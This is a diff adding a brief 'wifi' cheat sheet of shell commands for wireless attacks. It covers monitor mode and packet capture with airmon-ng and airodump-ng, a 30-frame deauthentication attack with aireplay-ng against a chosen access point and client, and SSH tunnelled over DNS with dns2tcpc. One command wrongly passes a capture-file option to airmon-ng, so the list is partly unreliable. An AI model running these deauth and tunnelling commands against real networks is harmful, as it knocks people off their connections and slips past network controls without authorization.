@@ -1,0 +1,19 @@
+# wifi
+
+# Enable packet forwarding
+sudo sysctl net.ipv4.ip_forward=1
+
+# Create a new monitoring interface
+sudo airmon-ng start wlan0
+
+# save captured data
+sudo airmon-ng start wlan0 -w dump.cap
+
+# Deauth frames
+sudo aireplay-ng -0 30 -a {BSSID} -c {STATION} mon0 -e {ESSID} --ignore-negative-one
+
+# Listen on this interface
+sudo airodump-ng mon0
+
+# Tunnel DNS
+dns2tcpc -z {host} -c -d 1 -l 9000 -r ssh -k {key}
